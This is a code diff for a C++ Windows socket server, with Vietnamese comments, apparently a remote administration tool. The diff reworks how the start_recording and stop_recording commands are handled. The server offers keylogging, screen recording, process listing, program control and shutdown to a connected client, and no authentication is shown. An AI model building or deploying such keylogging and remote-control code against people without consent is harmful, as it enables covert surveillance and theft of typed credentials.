@@ -12,14 +12,15 @@ std::map<std::string, std::string> fileCommands = {
     {"list_program", saveDir + "running_programs.txt"},
     {"list_process", saveDir + "processes_with_pid.txt"},
     {"list_installed", saveDir + "installed_programs.txt"},
-    {"start_recording", saveDir + "recording.avi"},
-    {"stop_recording",
-     saveDir + "recording.avi"},  // Thêm stop_recording vào đây
-    {"keylogger", saveDir + "keylog.txt"}};
+    {"keylogger", saveDir + "keylog.txt"}
+    // XÓA dòng start_recording ở đây
+};
 
-// simpleCommands chỉ nên chứa các lệnh đơn giản
-std::set<std::string> simpleCommands = {"shutdown", "restart",
-                                        "cancel_shutdown"};
+// Các command không cần tạo file nhưng cần confirmation - THÊM start_recording
+std::set<std::string> simpleCommands = {
+    "shutdown", "restart", "cancel_shutdown", "stop_recording",
+    "start_recording"  // THÊM start_recording vào đây
+};
 
 bool is_start_program_command(const std::string& command) {
   return command.find("start_program") == 0;
@@ -66,11 +67,11 @@ static std::string trim(const std::string& s) {
 void handle_client(SOCKET clientSocket) {
   std::cout << "[Connection] Client connected" << std::endl;
 
-  int sendBufSize =  8 * 1024 * 1024;  // 64KB send buffer
-  int recvBufSize = 8 * 1024 * 1024;  // 64KB receive buffer
-  int timeout = 600000;         // 5 minutes timeout
-  int keepAlive = 1;            // Enable keep-alive
-  int noDelay = 1;              // Disable Nagle algorithm
+  int sendBufSize = 8 * 1024 * 1024;  // 8MB send buffer
+  int recvBufSize = 8 * 1024 * 1024;  // 8MB receive buffer
+  int timeout = 600000;               // 10 minutes timeout
+  int keepAlive = 1;                  // Enable keep-alive
+  int noDelay = 1;                    // Disable Nagle algorithm
 
   setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBufSize,
              sizeof(sendBufSize));
@@ -169,9 +170,22 @@ void handle_client(SOCKET clientSocket) {
              is_start_process_command(command) ||
              is_stop_program_command(command) ||
              is_stop_process_command(command)) {
-      execute_command(command);
+      // Xử lý đặc biệt cho start_recording
+      if (command == "start_recording") {
+        std::string outputFile = saveDir + "recording.avi";
+        std::filesystem::create_directories(
+            std::filesystem::path(outputFile).parent_path());
 
-      if (command == "stop_recording") {
+        // Chỉ start recording, KHÔNG gửi file ngay
+        execute_command_with_file(command, outputFile);
+
+        // Gửi confirmation message
+        std::string confirmMsg = "Recording started successfully";
+        size_t msgSize = confirmMsg.length();
+        send(clientSocket, reinterpret_cast<const char*>(&msgSize),
+             sizeof(msgSize), 0);
+        send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
+      } else if (command == "stop_recording") {
         execute_command(command);
 
         // Đợi recording hoàn tất với timeout
@@ -213,6 +227,8 @@ void handle_client(SOCKET clientSocket) {
                sizeof(fileSize), 0);
         }
       } else {
+        // Xử lý các command khác (shutdown, restart, start_program, etc.)
+        execute_command(command);
         std::string confirmMsg = "Command executed: " + command;
         size_t msgSize = confirmMsg.length();
         send(clientSocket, reinterpret_cast<const char*>(&msgSize),
@@ -220,6 +236,7 @@ void handle_client(SOCKET clientSocket) {
         send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
       }
     } else {
+      // Unknown command
       std::cout << "[Error] Unknown command received: " << command << std::endl;
       std::string errorMsg = "Unknown command: " + command;
       size_t msgSize = errorMsg.length();
